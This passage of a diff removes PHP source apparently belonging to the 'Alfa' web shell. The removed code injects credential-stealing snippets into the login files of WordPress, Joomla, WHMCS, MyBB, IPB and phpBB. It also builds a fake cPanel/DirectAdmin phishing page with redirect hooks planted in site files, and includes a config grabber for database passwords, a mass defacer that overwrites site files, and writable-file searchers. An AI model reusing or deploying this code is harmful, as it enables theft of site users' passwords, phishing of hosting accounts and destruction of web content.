-if(strstr($data_login, $dologin) || strstr($data_class, $clearpw)){
-$login_replace = str_replace($dologin,$evil_login, $data_login);
-$class_replace = str_replace($clearpw,$evil_class, $data_class);
-@file_put_contents($login, $login_replace);
-@file_put_contents($class, $class_replace);
-hijackOutput(0,$saveto);
-}else{
-hijackOutput(1);
-}
-}else{
-hijackOutput(1);
-}
-}
-function hijackwp($path,$saveto){
-$code = '$alfa_file="{saveto_path}";$fp = fopen($alfa_file, "a+");fwrite($fp, $_POST[\'log\']." : ".$_POST[\'pwd\']." (".($user->user_email).")\n");fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
-$redirect_wp = '#if[ ]{0,}\([ ]{0,}![ ]{0,}is_wp_error\([ ]{0,}\$user[ ]{0,}\)[ ]{0,}&&[ ]{0,}![ ]{0,}\$reauth[ ]{0,}\)[ ]{0,}{#';
-$code=str_replace('{saveto_path}',$saveto,$code);
-$login=$path."/wp-login.php";
-if(@is_file($login) AND @is_writable($login)){
-$data_login = @file_get_contents($login);
-if(@preg_match($redirect_wp, $data_login, $match)){
-$evil_login = "\t".$match[0]."\n\t".$code;
-$login_replace = @preg_replace($redirect_wp,$evil_login, $data_login);
-@file_put_contents($login, $login_replace);
-hijackOutput(0,$saveto);
-}else{
-hijackOutput(1);
-}
-}else{
-hijackOutput(1);
-}
-}
-function hijackJoomla($path,$saveto){
-$code = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$Alfa_data = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($Alfa_data, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
-$code=str_replace('{saveto_path}',$saveto,$code);
-$comp=$path."/administrator/components/com_login/";
-if(@is_file($comp."/login.php")){
-$login = $comp."/login.php";
-}elseif(@is_file($comp."/admin.login.php")){
-$login = $comp."/admin.login.php";
-}else{
-$login = '';
-}
-if(@is_file($login) AND @is_writable($login) AND $login != ''){
-$data_login = @file_get_contents($login);
-$evil_login = $code."\n".$data_login;
-@file_put_contents($login, $evil_login);
-hijackOutput(0,$saveto);
-}else{
-hijackOutput(1);
-}
-}
-function hijackWhmcs($path,$saveto){
-$code = '<?php if(isset($_POST[\'username\']) AND isset($_POST[\'password\']) AND !empty($_POST[\'username\']) AND !empty($_POST[\'password\'])){if($alfa_connect=@mysqli_connect($db_host,$db_username,$db_password,$db_name)){$alfa_file = "{saveto_path}";$alfa_uname = @$_POST[\'username\'];$alfa_pw = @$_POST[\'password\'];if(isset($_POST[\'language\'])){$alfa_q = "SELECT * FROM tbladmins WHERE `username` = \'$alfa_uname\' AND `password` = \'".md5($alfa_pw)."\'";$admin = true;}else{$alfa_q = "SELECT * FROM tblclients WHERE `email` = \'$alfa_uname\'";$admin = false;}$alfa_query = mysqli_query($alfa_connect, $alfa_q);if(mysqli_num_rows($alfa_query) > 0 ){$row = mysqli_fetch_array($alfa_query);$allow = true;if(!$admin){$__salt = explode(\':\', $row[\'password\']);$__encPW = md5($__salt[1].$_POST[\'password\']).\':\'.$__salt[1];if($row[\'password\'] == $__encPW){$allow = true;$row[\'username\'] = $row[\'email\'];}else{$allow = false;}}if($allow){$fp = @fopen($alfa_file, "a+");@fwrite($fp, $row[\'username\'] . \' : \' .  $alfa_pw." (" . $row["email"] . ") : ".($admin ? \'is_admin\' : \'is_user\')."\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);}}}}?>';
-$code=str_replace('{saveto_path}',$saveto,$code);
-$conf=$path."/configuration.php";
-if(@is_file($conf) AND @is_writable($conf)){
-$data_conf = @file_get_contents($conf);
-if(!strstr($data_conf,'?>'))$code = '?>'.$code;
-$evil_conf = $data_conf."\n".$code;
-@file_put_contents($conf, $evil_conf);
-hijackOutput(0,$saveto);
-}else{
-hijackOutput(1);
-}
-}
-function hijackMybb($path,$saveto){
-$code = '$alfa_q = $db->query("SELECT `email` FROM ".TABLE_PREFIX."users WHERE `username` = \'".$user[\'username\']."\'");$alfa_fetch = $db->fetch_array($alfa_q);$alfa_file = "{saveto_path}";$fp = @fopen($alfa_file, "a+");@fwrite($fp, $user[\'username\']." : ". $user[\'password\']." ( ".$alfa_fetch[\'email\']." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);';
-$find = '$loginhandler->complete_login();';
-$code=str_replace('{saveto_path}',$saveto,$code);
-$login=$path."/member.php";
-$evil_login = "\t".$code."\n\t".$find;
-if(@is_file($login) AND @is_writable($login)){
-$data_login = @file_get_contents($login);
-if(strstr($data_login, $find)){
-$login_replace = str_replace($find,$evil_login, $data_login);
-@file_put_contents($login, $login_replace);
-hijackOutput(0,$saveto);
-}else{
-hijackOutput(1);
-}
-}else{
-hijackOutput(1);
-}
-}
-function hijackIPB($path,$saveto){
-$code = '$Alfa_q = $this->DB->buildAndFetch(array(\'select\' => \'email\', \'from\' => \'members\', \'where\' => \'name="\'.$username.\'" OR email="\'.$email.\'"\'));$Alfa_file = "{saveto_path}";$fp = @fopen($Alfa_file, "a+");@fwrite($fp, $_POST[\'ips_username\'].\' : \'.$_POST[\'ips_password\'].\' ( \'.$Alfa_q[\'email\'].\' )\'."\n");@fclose($fp);$f = @file($Alfa_file);$new = array_unique($f);$fp = @fopen($Alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
-$find = 'unset( $member[\'plainPassword\'] );';
-$code=str_replace('{saveto_path}',$saveto,$code);
-$login=$path."/admin/sources/handlers/han_login.php";
-$evil_login = "\t".$find."\n\t".$code;
-if(@is_file($login) AND @is_writable($login)){
-$data_login = @file_get_contents($login);if(strstr($data_login, $find)){
-$login_replace = str_replace($find,$evil_login, $data_login);
-@file_put_contents($login, $login_replace);
-hijackOutput(0,$saveto);
-}else{
-hijackOutput(1);
-}
-}else{
-hijackOutput(1);
-}
-}
-function hijackPHPBB($path,$saveto){
-$code = '$Alfa_u = request_var(\'username\', \'\');$Alfa_p = request_var(\'password\', \'\');if($Alfa_u != \'\' AND $Alfa_p != \'\'){$Alfa_response = $auth->login($Alfa_u,$Alfa_p);if($Alfa_response[\'status\'] == LOGIN_SUCCESS){$Alfa_file ="{saveto_path}";$fp = @fopen($Alfa_file, "a+");@fwrite($fp, $Alfa_u." : ".$Alfa_p. " ( ".$Alfa_response[\'user_row\'][\'user_email\']." )\n");@fclose($fp);$f = @file($Alfa_file);$new = array_unique($f);$fp = @fopen($Alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
-$find = 'case \'login\':';
-$code=str_replace('{saveto_path}',$saveto,$code);
-$login=$path."/ucp.php";
-$evil_login = "\t".$find."\n\t".$code;
-if(@is_file($login) AND @is_writable($login)){
-$data_login = @file_get_contents($login);
-if(strstr($data_login, $find)){
-$login_replace = str_replace($find,$evil_login, $data_login);
-@file_put_contents($login, $login_replace);
-hijackOutput(0,$saveto);
-}else{
-hijackOutput(1);
-}
-}else{
-hijackOutput(1);
-}
-}
-function hijackOutput($c=0,$p=''){echo($c==0?"<center><font color='green'>Success</font> --> path: $p</center>":'<center><font color="red">Error in inject code !</font></center>');}
-function Alfa_StrSearcher($dir,$string,$ext,$e,$arr=array()){
-if(@is_dir($dir)){
-$files=@scandir($dir);
-foreach($files as $key => $value){
-$path=@realpath($dir. DIRECTORY_SEPARATOR .$value);
-if(!@is_dir($path)){
-if($ext!='*'){$f = basename($path);$f = explode('.',$f);$f = end($f);if($f!=$ext)continue;}
-if($e=='str'){
-$content = @file_get_contents($path);
-if(strpos($content, $string) !== false){
-echo str_replace('\\','/',$path) . "<br>";
-}
-}else{
-if(strstr($value,$string)){
-echo str_replace('\\','/',$path) . "<br>";
-}
-}
-$results[] = $path;
-}elseif($value != "." && $value != "..") {
-Alfa_StrSearcher($path,$string,$ext,$e,$results);
-$results[] = $path;
-}}}}
-function alfafakepage(){
-	alfahead();
-	AlfaNum(9,10);
-	echo '<div class=header><br>
-	<center><div class="txtfont_header">| Host Manager Fake page |</div></center><br><br><form onSubmit="g(\'fakepage\',null,this.clone_page.value,this.fake_root.value,\'>>\',this.logto.value,this.panel.value,this.inject_to.value,this.bind_on.value,this.count.value);return false;" method=\'post\'>
-	<div class="txtfont" style="position: relative;left: 50%;transform: translate(-50%);"><div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Panel: </span><select style="width:100px;" name="panel">';
-	$cm_array = array("cpanel"=>"Cpanel","directadmin"=>"DirectAdmin");
-	foreach($cm_array as $key=>$val)echo '<option value="'.$key.'">'.$val.'</option>';
-	echo("</select></div>");
-	echo '<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Clone page: </span><input size="50" type="text" name="clone_page" placeholder="eg: https://target.com:2083 | https://target.com:2222"></div>
-	<div style="margin-bottom:6px;"><span>Fake page root: </span><input size="50" type="text" name="fake_root" value="'.$_SERVER["DOCUMENT_ROOT"].'/fake_page_root/"></div>
-	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Inject to: </span><input size="50" type="text" name="inject_to" value="'.$_SERVER["DOCUMENT_ROOT"].'/index.php"></div>
-	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Bind on: </span><input size="50" type="text" name="bind_on" placeholder="eg: '.$_SERVER["DOCUMENT_ROOT"].'/wp-login.php"></div>
-	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Log To: </span><input size="50" type="text" name="logto" value="'.$GLOBALS['cwd'].'logs.txt"></div>
-	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Count of Invalid login: </span><input size="20" type="text" name="count" value="3" style="text-align:center;"></div>
-	<div style="text-align:center;"><input type="submit" name="btn" value=" "></div></div></form><br>';
-	$clone_page = $_POST['alfa1'];
-	$fake_root = $_POST['alfa2'];
-	$logto = $_POST['alfa4'];
-	$panel = $_POST['alfa5'];
-	$inject_to = $_POST['alfa6'];
-	$bind_on = $_POST['alfa7'];
-	$count = $_POST['alfa8'];
-	if(!empty($clone_page) && !empty($fake_root) && !empty($logto) && !empty($inject_to) && !empty($bind_on) && $_POST['alfa3'] == '>>'){
-		echo __pre();
-		$target = $clone_page;
-		$curl = new AlfaCURL();
-		$source_page = $curl->Send($target);
-		if(!empty($source_page)){
-			$matched_form = "";
-			if($panel == "cpanel"){
-				if(preg_match('#<form(.*)id="login_form"(.*)>#', $source_page, $match)){
-					$matched_form = $match[0];
-				}
-			}else{
-				if(preg_match('#<form(.*?)>#', $source_page, $match)){
-					$matched_form = $match[0];
-				}
-			}
-			if(!empty($matched_form)){
-				$fake = "";
-				$pwd = str_replace($_SERVER["DOCUMENT_ROOT"], '', $fake_root);
-				$uri = str_replace($_SERVER["DOCUMENT_ROOT"], '', $inject_to);
-				if($panel == "cpanel"){
-					$port = "2083";
-				}else{
-					$target = str_replace(array("http://", "https://"), "", $target);
-					$port = explode(":",$target);
-					$port = $port[1];
-				}
-				if(substr($uri, 0, 1) == "/"){
-					$uri = substr($uri, 1);
-				}
-				$uri = $_SERVER["HTTP_ORIGIN"] . '/' . str_replace("index.php", "", $uri) . '?:' . $port;
-				$log_url = $_SERVER["HTTP_ORIGIN"] . $pwd . '/log.php';
-				if($panel == "cpanel"){
-					$form = '<form novalidate id="login_form" action="'.$log_url.'" method="post" target="_top" style="visibility:">';
-				}else{
-					$form = '<form action="'.$log_url.'" method="post">';
-				}
-				$fake = str_replace($matched_form, $form, $source_page);
-				if(@!is_dir($fake_root)){
-					@mkdir($fake_root, 0777, true);
-				}
-
-				$cookie_name = "alfa_fakepage_counter" . rand(9999,99999);
-
-				$post_user = 'user';
-				$post_pass = 'pass';
-				$resp_code = 'if(empty($user)){http_response_code(400);echo json_encode(array("message" => "no_username"));}else{http_response_code(401);}';
-				if($panel != "cpanel"){
-					$post_user = 'username';
-					$post_pass = 'password';
-					$resp_code = '@header("Location: ".$_SERVER[\'HTTP_REFERER\']);';
-				}
-
-				$cpanel_log = '<?php $cook_time = time()+(86400 * 7); $user = $_POST["'.$post_user.'"];$pass = $_POST["'.$post_pass.'"];if(!empty($user) && !empty($pass)){if(!isset($_COOKIE["'.$cookie_name.'"])){@setcookie("'.$cookie_name.'", 0, $cook_time, "/");$_COOKIE["'.$cookie_name.'"]=1;}if((int)$_COOKIE["'.$cookie_name.'"]>'.$count.'){@header("Location: /");exit;}@setcookie("'.$cookie_name.'", ((int)$_COOKIE["'.$cookie_name.'"] + 1), $cook_time, "/");$fp = @fopen("'.$logto.'", "a+");@fwrite($fp, $user . " : " . $pass . "\n");fclose($fp);sleep(3);'.$resp_code.'exit;}?>';
-
-				@file_put_contents($fake_root.'/log.php', $cpanel_log);
-
-				if($panel == "cpanel"){
-					$fake = preg_replace(array('#<link(.*)href="(.*)"(.*)>#', '#<img class="main-logo" src="(.*)"(.*)>#', '# <a(.*)id="reset_password">#'), array('<link href="'.$target.'/$2">', '<img class="main-logo" src="'.$target.'/$1" alt="logo" />', '<a href="#" id="reset_password">'), $fake);
-				}
-
-				@file_put_contents($fake_root.'/index.php', $fake);
-
-				$inject_code = '<?php if(isset($_GET[":2083"])&&(int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@include("'.$fake_root.'/index.php");exit;}?>';
-				$bind_on_code = '<?php if((int)$_COOKIE["'.$cookie_name.'"]<'.$count.'){@header("Location: '.$uri.'");exit;}?>';
-
-				@file_put_contents($inject_to, $inject_code . "\n" .@file_get_contents($inject_to));
-				@file_put_contents($bind_on, $bind_on_code . "\n" .@file_get_contents($bind_on));
-
-				echo "success...!";
-			}else{
-				echo "failed...!";
-			}
-		}else{
-			echo("<div style='text-align:center;color:red;'>Cannot open the target...!</div>");
-		}
-	}
-	echo '</div>';
-	alfafooter();
-}
-function alfaarchive_manager(){
-	alfahead();
-	$file = $_POST['alfa2'];
-	if(!file_exists($file)){
-		$file = $GLOBALS['cwd'];
-	}
-	$rand_id = rand(9999, 999999);
-	echo '<div class=header><center><p><div class="txtfont_header">| Archive Manager |</div></p>';
-	echo '<form name="srch" onSubmit="g(\'archive_manager\',null,null,this.file.value,null,null,\'>>\');return false;" method=\'post\'>
-	<div class="txtfont">
-	Archive file: <input size="50" id="target" type="text" name="file" value="'.$file.'">
-	<input type="submit" name="btn" value=" "></div></form></center><br>';
-	if($_POST['alfa5']=='>>'){
-		//echo __pre();
-		echo '<hr><div style="margin-left: 12px;" archive_full="phar://'.$file.'" archive_name="'.basename($file).'" id="archive_dir_'.$rand_id.'" class="archive_dir_holder"><span>PWD: </span><div class="archive_pwd_holder" style="display:inline-block"><a>/</a></div></div>';
-		echo '<div style="padding: 10px;" id="archive_base_'.$rand_id.'">';
-		__alfa_open_archive_file($file, $rand_id);
-		echo '</div>';
-	}
-	echo '</div>';
-	alfafooter();
-}
-function __alfa_open_archive_file($arch, $base_id=0){
-	try{
-		$files = array();
-		$dirs = array();
-		$archive = new PharData($arch);
-		 foreach($archive as $file) {
-			 $file_modify = @date('Y-m-d H:i:s', @filemtime($file->getPathname()));
-		     if($file->isDir()) {
-				 $dirs[] = array("name" => $file->getFileName(), "path" => $file->getPathname(), "type" => "dir", "modify" => $file_modify);
-		     }else{
-				 $file_size = @filesize($file->getPathname());
-				 $files[] = array("name" => $file->getFileName(), "path" => $file->getPathname(), "type" => "file",  "modify" => $file_modify, "size" => $file_size);
-			 }
-		 }
-		 function __alfa_open_archive_usort($a, $b){
-			 return strcmp(strtolower($a['name']), strtolower($b['name']))*1;
-		 }
-		 usort($dirs, "__alfa_open_archive_usort");
-		 usort($files, "__alfa_open_archive_usort");
-		 $files = array_merge($dirs, $files);
-		 echo '<table width="100%" class="main" cellspacing="0" cellpadding="2"><tbody><tr><th>Name</th><th>Size</th><th>Modify</th><th>Actions</th></tr>';
-		 $icon = '<img class="archive-icons" src="'.findicon('..','dir').'" width="30" height="30">';
-		 echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" fname=".." onclick="alfaOpenArchive(this);" path="'.dirname($arch.'.php').'">'.$icon.'<span class="archive-name archive-type-dir">| .. |</span></a><td>dir</td><td>-</td><td>-</td></tr>';
-		 foreach($files as $file){
-			 $icon = '<img class="archive-icons" src="'.findicon($file['name'],$file['type']).'" width="30" height="30">';
-			 if($file["type"] == "dir"){
-			 	echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" onclick="alfaOpenArchive(this);" path="'.$file["path"].'" fname="'.$file["name"].'">'.$icon.'<span class="archive-name archive-type-dir">| '.$file["name"].' |</span></a><td>dir</td><td>'.$file["modify"].'</td><td>-</td></tr>';
-		 	}else{
-				echo "<tr><th><a base_id='".$base_id."' class='archive-file-row' onclick=\"editor('".$file["path"]."','auto','','','','file');\">".$icon."<span class='archive-name archive-type-file' fname='".$file["name"]."'>".$file["name"]."</span></a><td>".alfaSize($file["size"])."</td><td>".$file["modify"]."</td><td>-</td></tr>";
-
-			}
-		 }
-		  echo '</table>';
-	}catch(Exception $e){
-		echo("0");
-	}
-}
-function alfaopen_archive_dir(){
-	$dir = $_POST["alfa1"];
-	$base_id = $_POST["alfa2"];
-	__alfa_open_archive_file($dir, $base_id);
-}
-function alfaconfig_grabber(){
-	alfahead();
-	echo '<div class=header><center><p><div class="txtfont_header">| Config Grabber |</div></p>';
-	echo '<form name="srch" onSubmit="g(\'config_grabber\',null,null,this.dir.value,this.ext.value,null,\'>>\');return false;" method=\'post\'>
-	<div class="txtfont">
-	Dir: <input size="50" id="target" type="text" name="dir" value="'.$GLOBALS['cwd'].'">
-	Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
-	<input type="submit" name="btn" value=" "></div></form></center><br>';
-	$dir = $_POST['alfa2'];
-	$ext = $_POST['alfa3'];
-	if($_POST['alfa5']=='>>'){
-		echo __pre();
-		Alfa_ConfigGrabber($dir, $ext);
-	}
-	echo '</div>';
-	alfafooter();
-}
-function Alfa_ConfigGrabber($dir, $ext) {
-	$pattern = "#define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,}|define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOSTNAME(?:'|\")[ ]{0,}|config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")password(?:'|\")\]|(?:'|\")database(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")|(?:'|\")(mysql|database)(?:'|\")[ ]{0,}=>[ ]{0,}array|db_name|db_user|db_pass|db_server|db_host|dbhost|dbname|dbuser|dbpass|database_name|database_user|database_pass|mysql_user|mysql_pass|mysqli_connect|mysql_connect|new[ ]{0,}mysqli#i";
-	$db_files = array("wp-config.php","configure.php","config.inc.php","configuration.php","config.php","conf.php","dbclass.php","class_core.php","dist-configure.php", "settings.php", "conf_global.php", "db.php", "connect.php", "confing.db.php", "config.db.php", "database.php");
-	if(@is_readable($dir)){
-		$globFiles = @glob("$dir/*.$ext");
-		$globDirs  = @glob("$dir/*", GLOB_ONLYDIR);
-		$blacklist = array();
-		foreach ($globDirs as $dir) {
-			if(!@is_readable($dir)||@is_link($dir)) continue;
-			@Alfa_ConfigGrabber($dir, $ext);
-		}
-		foreach ($globFiles as $file){
-			$filee = @file_get_contents($file);
-			if(preg_match($pattern, $filee)){
-				echo "<div><span>$file</span> <a style='cursor:pointer;' onclick=\"editor('".$file."','auto','','','','file');\">[ View file ]</a></div>";
-			}
-		}
-	}
-}
-function alfasearcher(){
-alfahead();
-echo '<div class=header><center><p><div class="txtfont_header">| Searcher |</div></p><h3><a href=javascript:void(0) onclick="g(\'searcher\',null,\'file\')">| Find Readable Or Writable Files | </a><a href=javascript:void(0) onclick="g(\'searcher\',null,\'str\')">| Find Files By Name | </a></h3></center>';
-if(isset($_POST['alfa1'])&&$_POST['alfa1']=='file'){
-echo '<center><div class="txtfont_header">| Find Readable Or Writable Files  |</div><br><br><form name="srch" onSubmit="g(\'searcher\',null,\'file\',this.filename.value,this.ext.value,this.method.value,\'>>\');return false;" method=\'post\'>
-<div class="txtfont">
-Method: <select style="width: 18%;" onclick="alfa_searcher_tool(this.value);" name="method"><option value="files">Find All Writable Files</option><option value="dirs">Find All Writable Dirs</option><option value="all">Find All Readable And Writable Files</option></select>
-Dir: <input size="50" id="target" type="text" name="filename" value="'.$GLOBALS['cwd'].'">
-Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
-<input type="submit" name="btn" value=" "></div></form></center><br>';
-$dir = $_POST['alfa2'];
-$ext = $_POST['alfa3'];
-$method = $_POST['alfa4'];
-if($_POST['alfa5']=='>>'){
-echo __pre();
-if(substr($dir,-1)=='/')$dir=substr($dir,0,-1);
-Alfa_Searcher($dir,trim($ext),$method);
-}
-}
-if($_POST['alfa1']=='str'){
-echo '<center><div class="txtfont_header">| Find Files By Name / Find String In Files |</div><br><br><form onSubmit="g(\'searcher\',null,\'str\',this.dir.value,this.string.value,\'>>\',this.ext.value,this.method.value);return false;" method=\'post\'>
-<div class="txtfont">
-Method: <select name="method"><option value="name">Find Files By Name</option><option value="str">Find String In Files</option></select>
-String: <input type="text" name="string" value="">
-Dir: <input size="50" type="text" name="dir" value="'.$GLOBALS['cwd'].'">
-Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
-<input type="submit" name="btn" value=" "></div></form></center><br>';
-$dir = $_POST['alfa2'];
-$string = $_POST['alfa3'];
-$ext = $_POST['alfa5'];
-if(!empty($string) AND !empty($dir) AND $_POST['alfa4'] == '>>'){
-echo __pre();
-Alfa_StrSearcher($dir,$string,$ext,$_POST['alfa6']);
-}
-}
-echo '</div>';
-alfafooter();
-}
-function alfaMassDefacer(){
-alfahead();
-AlfaNum(5,6,7,8,9,10);
-echo "<div class=header><center><p><div class='txtfont_header'>| Mass Defacer |</div></p><form onSubmit=\"g('MassDefacer',null,this.massdir.value,this.defpage.value,this.method.value,'>>');return false;\" method='post'>";
-echo '<div class="txtfont">Deface Method: <select name="method"><option value="index">Deface Index Dirs</option><option value="all">All Files</option></select>
-	Mass dir: <input size="50" id="target" type="text" name="massdir" value="'.htmlspecialchars($GLOBALS['cwd']).'">
-	DefPage: <input size="50" type="text" name="defpage" value="'.htmlspecialchars($GLOBALS['cwd']).'"></div> <input type="submit" name="btn" value=" "></center></p>
-</form>';
-$dir = $_POST['alfa1'];
-$defpage = $_POST['alfa2'];
-$method = $_POST['alfa3'];
-$fCurrent = $GLOBALS['__file_path'];
-if($_POST['alfa4'] == '>>'){
-if(!empty($dir)){
-if(@is_dir($dir)){
-if(@is_readable($dir)){
-if(@is_file($defpage)){
-if($dh = @opendir($dir)){
-echo __pre();
-while (($file = @readdir($dh)) !== false){
-if($file == '..' || $file == '.')continue;
-$newfile=$dir.$file;
-if($fCurrent == $newfile)continue;
-if(@is_dir($newfile)){
-Alfa_ReadDir($newfile,$method,$defpage);
-}else{
-if(!@is_writable($newfile))continue;
-if(!@is_readable($newfile))continue;
-Alfa_Rewriter($newfile,$file,$defpage,$method);
-}
-}
-closedir($dh);
-}else{__alert('<font color="red">Error In OpenDir...</font>');}
-}else{__alert('<font color="red">DefPage File NotFound...</font>');}
-}else{__alert('<font color="red">Directory is not Readable...</font>');}
-}else{__alert('<font color="red">Mass Dir is Invalid Dir...</font>');}
-}else{__alert('<font color="red">Dir is Empty...</font>');}
-}
-echo '</div>';
-alfafooter();
-}
-function Alfa_ReadDir($dir,$method='',$defpage=''){
-if(!@is_readable($dir)) return false;
-if (@is_dir($dir)) {
-if ($dh = @opendir($dir)) {
-while(($file=readdir($dh))!==false) {
-if($file == '..' || $file == '.')continue;
-$newfile=$dir.'/'.$file;
-if(@is_readable($newfile)&&@is_dir($newfile))Alfa_ReadDir($newfile,$method,$defpage);
-if(@is_file($newfile)){
-if(!@is_readable($newfile))continue;
-Alfa_Rewriter($newfile,$file,$defpage,$method);
-}
-}
-closedir($dh);
-}
-}
-}
-function Alfa_Rewriter($dir,$file,$defpage,$m='index'){
-if(!@is_writable($dir)) return false;
-if(!@is_readable($dir)) return false;
-$defpage=@file_get_contents($defpage);
-if($m == 'index'){
-$indexs = array('index.php','index.htm','index.html','default.asp','default.aspx','index.asp','index.aspx','index.js');
-if(in_array(strtolower($file),$indexs)){
-@file_put_contents($dir,$defpage);
-echo @is_file($dir)?$dir."<b><font color='red'>DeFaced...</b></font><br>" : '';
-}
-}elseif($m=='all'){
-@file_put_contents($dir,$defpage);
-echo @is_file($dir)?$dir."  <b><font color='red'>DeFaced...</b></font><br>" : '';
-}
-}
-function alfaGetDisFunc(){
-alfahead();
-echo '<div class="header">';
-$disfun = @ini_get('disable_functions');
-$s = explode(',',$disfun);
-$f = array_unique($s);
-echo '<center><br><b><font color="#7CFC00">Disable Functions</font></b><pre><table border="1"><tr><td align="center" style="background-color: green;color: white;width:5%">#</td><td align="center" style="background-color: green;color: white;">Func Name</td></tr>';
-$i=1;
-foreach($f as $s){
-$s=trim($s);
-if(function_exists($s)||!is_callable($s))continue;
-echo '<tr><td align="center" style="background-color: black;">'.$i.'</td>';
-echo '<td align="center" style="background-color: black;"><a style="text-decoration: none;" target="_blank" href="http://php.net/manual/en/function.'.str_replace('_','-',$s).'.php"><span class="disable_functions"><b>'.$s.'</b></span></a></td>';
-$i++;
-}
-echo '</table></center>';
-echo '</div>';
-alfafooter();
-}
-function Alfa_Create_A_Tag($action,$vals){
-$nulls = array();
-foreach($vals as $key => $val){
-echo '<a href=javascript:void(0) onclick="g(\''.$action.'\',';
-for($i=1;$i<=$val[1]-1;$i++)$nulls[] = 'null';
-$f = implode(',',$nulls);
-echo $f.',\''.$val[0].'\');return false;">| '.$key.' | </a>';
-unset($nulls);
-}
-}
-function Alfa_Searcher($dir, $ext, $method) {
-if(@is_readable($dir)){
-if($method == 'all')$ext = '*';
-if($method == 'dirs')$ext = '*';
-$globFiles = @glob("$dir/*.$ext");
-$globDirs  = @glob("$dir/*", GLOB_ONLYDIR);
-$blacklist = array();
-foreach ($globDirs as $dir) {
-if(!@is_readable($dir)||@is_link($dir)) continue;
-@Alfa_Searcher($dir, $ext, $method);
-}
-switch($method){
-case "files":
-foreach ($globFiles as $file){
-if(@is_writable($file)){
-echo "$file<br>";
-}
-}
-break;
-case "dirs":
-foreach ($globFiles as $file){
-if(@is_writable(dirname($file)) && !in_array(dirname($file), $blacklist)){
-echo dirname($file).'<br>';
-$blacklist[] = dirname($file);
-}
-}
-break;
-case "all":
-foreach ($globFiles as $file){
-echo $file.'<br>';
-}
-break;
-}
-unset($blacklist);
-}
-}
-function AlfaiFrameCreator($f,$width='100%',$height='600px'){
-return('<iframe src="'.__ALFA_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
-}
-class AlfaCURL {
-public $headers;
-public $user_agent;
-public $compression;
-public $cookie_file;
-public $proxy;
-public $path;
-public $ssl = true;
-public $curl_status = true;
-function __construct($cookies=false,$compression='gzip',$proxy=''){
-if(!extension_loaded('curl')){$curl_status = false;return false;}
-$this->headers[] = 'Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg';
-$this->headers[] = 'Connection: Keep-Alive';
-$this->headers[] = 'Content-type: application/x-www-form-urlencoded;charset=UTF-8';
-$this->user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36)';
-$this->path = ALFA_TEMPDIR.'/Alfa_cookies.txt';
-$this->compression=$compression;
-$this->proxy=$proxy;
-$this->cookies=$cookies;
-if($this->cookies)$this->cookie($this->path);
-}
-function cookie($cookie_file) {
-if (_alfa_file_exists($cookie_file,false)) {
-$this->cookie_file=$cookie_file;
-}else{
-@fopen($cookie_file,'w') or die($this->error('The cookie file could not be opened.'));
-$this->cookie_file=$cookie_file;
-@fclose($this->cookie_file);
-}
-}
-function Send($url,$method="get",$data=""){
-if(!$this->curl_status){return false;}
-$process = curl_init($url);
-curl_setopt($process, CURLOPT_HTTPHEADER, $this->headers);
-curl_setopt($process, CURLOPT_HEADER, 0);
-curl_setopt($process, CURLOPT_USERAGENT, $this->user_agent);
-curl_setopt($process, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($process, CURLOPT_ENCODING , $this->compression);
-curl_setopt($process, CURLOPT_TIMEOUT, 30);
-if($this->ssl){
-curl_setopt($process, CURLOPT_SSL_VERIFYPEER ,false);
-curl_setopt($process, CURLOPT_SSL_VERIFYHOST,false);
-}
-if($this->cookies){
-curl_setopt($process, CURLOPT_COOKIEFILE, $this->path);
-curl_setopt($process, CURLOPT_COOKIEJAR, $this->path);
-}
-if($this->proxy){
-curl_setopt($process, CURLOPT_PROXY, $this->proxy);
-}
-if($method=='post'){
-curl_setopt($process, CURLOPT_POSTFIELDS, $data);
-curl_setopt($process, CURLOPT_POST, 1);
-curl_setopt($process, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
-}
-$return = @curl_exec($process);
-curl_close($process);
-return $return;
-}
-function error($error) {
